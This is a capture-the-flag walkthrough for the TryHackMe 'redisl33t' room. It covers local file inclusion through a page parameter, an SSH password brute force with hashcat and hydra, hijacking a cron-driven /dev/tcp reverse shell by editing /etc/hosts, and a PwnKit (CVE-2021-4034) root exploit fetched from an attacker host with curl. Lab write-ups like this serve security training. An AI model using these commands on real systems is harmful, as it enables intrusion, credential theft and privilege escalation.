---
tags:
  - THM
  - Linux
  - Easy
  - LFI
  - Brute-Force
  - Cron
  - DNS-Spoof
  - PwnKit
---
https://tryhackme.com/room/redisl33t/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.17.251 red.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC red.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
|_  256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
Files are being specified in the URL, like the home page at `/index.php?page=home.html`.
# Exploitation
Found users **red** and **blue** by listing the `/etc/passwd` file:
```console
$ curl -s 'http://red.thm/index.php?page=file:///etc/passwd' | grep 'sh$'

root:x:0:0:root:/root:/bin/bash
blue:x:1000:1000:blue:/home/blue:/bin/bash
red:x:1001:1001::/home/red:/bin/bash
```
Found **blue**'s command history:
```console
$ curl -s 'http://red.thm/index.php?page=file:///home/blue/.bash_history'

echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```
At some point, **blue** created a **password list** and then deleted it. So, we will try to replicate his actions to guess his **password**.

Create **password list** and then brute-force to find the correct one:
```console
$ hashcat --stdout .reminder -r /usr/share/doc/hashcat/rules/best64.rule > passlist.txt

$ hydra -l blue -P passlist.txt ssh://red.thm
[22][ssh] host: red.thm   login: blue   password: sup3r_p@s$w0rd!

$ sshpass -p 'sup3r_p@s$w0rd!' ssh blue@red.thm
```
After log in via SSH as **blue**, get the **first flag**:
```bash
cat /home/blue/flag1
```
# Post-Exploitation
## User migration
After some intervals of time, messages sent by **red** appear on the terminal, so there is likely cron jobs running.

Created `procmon.sh` script to monitor processes:
```bash
#!/bin/bash

old_proc=$(ps -e -o pid,user,command)

while true; do
    new_proc=$(ps -e -o pid,user,command)
    diff <(echo "$old_proc") <(echo "$new_proc") | grep -E '^[<>]' | grep -vE 'kworker|pid,user,command'
    old_proc=$new_proc
done
```
Found a command run by **red**, which sends a reverse shell to `redrules.thm`:
```console
$ chmod +x procmon.sh

$ ./procmon.sh
>   34978 root     /usr/sbin/CRON -f
>   34980 root     [sh] <defunct>
>   34993 red      bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
<   34978 root     /usr/sbin/CRON -f
<   34980 root     [sh] <defunct>
```
Since we are **blue**, we can append data to the `/etc/hosts` file. So, we append our own IP address to redirect the traffic:
```console
$ ls -l /etc/hosts
-rw-r--rw- 1 root adm 242 Jul 11 20:33 /etc/hosts

$ lsattr /etc/hosts
-----a--------e----- /etc/hosts

$ echo '<ATTACKER-IP> redrules.thm' >> /etc/hosts
```
Wait for **red** to send a reverse shell:
```bash
nc -lvnp 9001
```
Get the **second flag**:
```bash
cat /home/red/flag2
```
## Privilege Escalation
Found `/home/red/.git/pkexec` with **SUID permissions** and vulnerable to **CVE-2021-4034**:
```console
$ ls -lA /home/red
lrwxrwxrwx 1 root root    9 Aug 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 red  red  3771 Feb 25  2020 .bashrc
drwx------ 2 red  red  4096 Aug 14  2022 .cache
-rw-r----- 1 root red    41 Aug 14  2022 flag2
drwxr-x--- 2 red  red  4096 Aug 14  2022 .git
-rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
-rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
-rw------- 1 red  red     0 Aug 17  2022 .viminfo

$ ls -lA /home/red/.git
-rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec

$ /home/red/.git/pkexec --version
pkexec version 0.105
```
Clone and modify the [PwnKit](https://github.com/ly4k/PwnKit) exploit:
```console
$ git clone https://github.com/ly4k/PwnKit.git

$ cd PwnKit

$ sed -i 's/\/usr\/bin\/pkexec/\/home\/red\/.git\/pkexec/' PwnKit.c

$ gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
```
Setup a Python server:
```bash
python3 -m http.server 8000
```
Download and execute the exploit from the victim's machine:
```console
$ curl -s -O 'http://<ATTACKER-IP>:8000/PwnKit'

$ chmod +x PwnKit

$ ./PwnKit
```
Get the **third flag**:
```bash
cat /root/flag3
```